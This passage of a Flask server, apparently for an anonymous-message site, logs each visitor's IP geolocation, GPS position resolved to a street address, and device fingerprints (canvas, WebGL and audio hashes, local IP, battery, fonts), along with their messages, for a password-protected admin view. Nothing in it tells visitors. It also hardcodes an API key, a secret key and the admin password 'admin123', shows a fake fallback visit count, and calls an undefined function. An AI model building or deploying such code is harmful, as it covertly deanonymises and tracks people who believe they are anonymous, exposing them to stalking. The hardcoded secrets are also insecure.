from supabase import create_client, Client
import os

app = Flask(__name__)
app.secret_key = 'super-secret-key-change-this' 
ADMIN_PASSWORD = 'admin123' 

SUPABASE_URL = "https://htrqocasllkejwyrhxma.supabase.co"
SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imh0cnFvY2FzbGxrZWp3eXJoeG1hIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzMxNTI1NjUsImV4cCI6MjA4ODcyODU2NX0.8axR4UC0TSySPSkadW3Vr9kB8M6AglXPiTKlrVrSYrk"
supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)

# No local DB init needed for Supabase

def reverse_geocode(lat, lon):
    """Convert Lat/Lon into a real-world address (village, street, city) using OpenStreetMap"""
    try:
        headers = {'User-Agent': 'SarhneCyberProject/1.0'}
        url = f"https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat={lat}&lon={lon}"
        resp = requests.get(url, headers=headers, timeout=5)
        data = resp.json()
        if 'display_name' in data:
            return data['display_name']
    except Exception as e:
        print("Geocode error:", e)
    return "Unknown Location"

def get_ip_info(ip):
    """Use free ip-api.com to get location info from IP address (server-side)"""
    info = {'country': 'N/A', 'city': 'N/A', 'isp': 'N/A', 'lat': 'N/A', 'lon': 'N/A'}
    if ip == '127.0.0.1' or ip == '::1':
        # For localhost testing, try to get our public IP
        try:
            resp = requests.get('http://ip-api.com/json/', timeout=3)
            data = resp.json()
            if data.get('status') == 'success':
                info['country'] = data.get('country', 'N/A')
                info['city'] = data.get('city', 'N/A')
                info['isp'] = data.get('isp', 'N/A')
                info['lat'] = str(data.get('lat', 'N/A'))
                info['lon'] = str(data.get('lon', 'N/A'))
        except:
            pass
    else:
        try:
            resp = requests.get(f'http://ip-api.com/json/{ip}', timeout=3)
            data = resp.json()
            if data.get('status') == 'success':
                info['country'] = data.get('country', 'N/A')
                info['city'] = data.get('city', 'N/A')
                info['isp'] = data.get('isp', 'N/A')
                info['lat'] = str(data.get('lat', 'N/A'))
                info['lon'] = str(data.get('lon', 'N/A'))
        except:
            pass
    return info

def parse_user_agent(ua_string):
    """Simple UA parsing to extract browser and OS name"""
    browser = 'Unknown'
    os_name = 'Unknown'
    device = 'Desktop'
    
    ua = ua_string.lower()
    
    # Browser detection
    if 'edg/' in ua: browser = 'Microsoft Edge'
    elif 'chrome/' in ua and 'safari/' in ua: browser = 'Google Chrome'
    elif 'firefox/' in ua: browser = 'Mozilla Firefox'
    elif 'safari/' in ua: browser = 'Apple Safari'
    elif 'opera' in ua or 'opr/' in ua: browser = 'Opera'
    
    # OS detection
    if 'windows nt 10' in ua: os_name = 'Windows 10/11'
    elif 'windows nt' in ua: os_name = 'Windows'
    elif 'mac os x' in ua: os_name = 'macOS'
    elif 'android' in ua: os_name = 'Android'
    elif 'iphone' in ua or 'ipad' in ua: os_name = 'iOS'
    elif 'linux' in ua: os_name = 'Linux'
    
    # Device type
    if 'mobile' in ua or 'android' in ua or 'iphone' in ua:
        device = 'Mobile'
    elif 'ipad' in ua or 'tablet' in ua:
        device = 'Tablet'
    
    return browser, os_name, device

@app.route('/', methods=['GET', 'POST'])
def home():
    try:
        res = supabase.table("visitors").select("id", count="exact").eq("action_type", "PAGE_VISIT").execute()
        count = res.count if res.count else 2339
    except:
        count = 2339
    
    return render_template('home.html', success=False, visits_count=count)
    
@app.route('/collect', methods=['POST'])
def collect():
    """Receives ALL fingerprint data from the browser via AJAX"""
    data = request.json or {}
    action = data.get('action_type', 'PAGE_VISIT')
    
    db = get_db()
    
    # 1. Provide a dedicated GPS Update endpoint block for accuracy tracking.
    if action == 'GPS_UPDATE':
        visitor_canvas = data.get('canvasHash', '')
        lat = data.get('lat')
        lon = data.get('lon')
        acc = data.get('acc')
        address = reverse_geocode(lat, lon)
        
        try:
            # Find the latest log for this canvasHash and update it
            latest = supabase.table("visitors").select("id").eq("canvas_hash", visitor_canvas).order("id", desc=True).limit(1).execute()
            if latest.data:
                target_id = latest.data[0]['id']
                supabase.table("visitors").update({
                    "ip_lat": str(lat),
                    "ip_lon": str(lon),
                    "exact_address": address,
                    "gps_accuracy": f"Within {acc} meters"
                }).eq("id", target_id).execute()
        except Exception as e:
            print("Supabase Update Error:", e)
            
        return jsonify({"status": "gps_updated"})

    # 2. Otherwise it's a PAGE_VISIT or MESSAGE_SENT
    message = data.get('message', '')
    
    # SERVER-SIDE: Get IP info Backup (always runs)
    ip = request.remote_addr
    ip_info = get_ip_info(ip)
    
    # Check if they sent GPS right away? usually unlikely unless pre-cached, but just in case
    lat = data.get('lat') or ip_info['lat']
    lon = data.get('lon') or ip_info['lon']
    address = "N/A"
    gps_acc = "N/A"
    
    if data.get('lat') and data.get('lon'):
        address = reverse_geocode(lat, lon)
        gps_acc = f"Within {data.get('acc', 'Unknown')} meters"
        
    # SERVER-SIDE: Parse User-Agent
    ua = request.user_agent.string
    browser, os_name, device = parse_user_agent(ua)
    
    supabase.table("visitors").insert({
        "action_type": action,
        "message": message,
        "ip_address": ip,
        "local_ip": str(data.get('localIp', 'Unknown')),
        "ip_country": ip_info['country'],
        "ip_city": ip_info['city'],
        "ip_isp": ip_info['isp'],
        "ip_lat": str(lat),
        "ip_lon": str(lon),
        "exact_address": address,
        "gps_accuracy": gps_acc,
        "user_agent": ua,
        "browser_name": browser,
        "os_name": os_name,
        "device_type": device,
        "screen_resolution": str(data.get('screen', '')),
        "color_depth": str(data.get('colorDepth', '')),
        "timezone": str(data.get('timezone', '')),
        "timezone_offset": str(data.get('timezoneOffset', '')),
        "sensor_data": str(data.get('sensorData', '')),
        "social_media": str(data.get('social', '')),
        "fonts": str(data.get('fonts', '')),
        "language": str(data.get('language', '')),
        "languages_all": str(data.get('languages', '')),
        "platform": str(data.get('platform', '')),
        "cpu_cores": str(data.get('cpuCores', '')),
        "ram_gb": str(data.get('ram', '')),
        "gpu_vendor": str(data.get('gpuVendor', '')),
        "gpu_renderer": str(data.get('gpuRenderer', '')),
        "canvas_hash": str(data.get('canvasHash', '')),
        "webgl_hash": str(data.get('webglHash', '')),
        "audio_hash": str(data.get('audioHash', '')),
        "connection_type": str(data.get('connectionType', '')),
        "connection_speed": str(data.get('connectionSpeed', '')),
        "battery_level": str(data.get('batteryLevel', '')),
        "battery_charging": str(data.get('batteryCharging', '')),
        "touch_support": str(data.get('touchSupport', '')),
        "cookie_enabled": str(data.get('cookieEnabled', '')),
        "do_not_track": str(data.get('doNotTrack', '')),
        "ad_blocker": str(data.get('adBlocker', '')),
        "webdriver": str(data.get('webdriver', '')),
        "plugins": str(data.get('plugins', '')),
        "referrer": str(data.get('referrer', '')),
        "page_url": str(data.get('pageUrl', ''))
    }).execute()
    
    return jsonify({"status": "ok"})

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        if request.form.get('password') == ADMIN_PASSWORD:
            session['logged_in'] = True
            return redirect(url_for('admin'))
        else:
            return "كلمة المرور خاطئة!"
    return render_template('login.html')

@app.route('/logout')
def logout():
    session.pop('logged_in', None)
    return redirect(url_for('login'))

@app.route('/admin')
def admin():
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    res = supabase.table("visitors").select("*").order("created_at", desc=True).execute()
    visitors = res.data
    return render_template('admin.html', visitors=visitors)

@app.route('/dashboard')
def dashboard():
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    res = supabase.table("visitors").select("*").order("created_at", desc=True).execute()
    visitors = res.data
    return render_template('dashboard.html', visitors=visitors)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5001, debug=True)
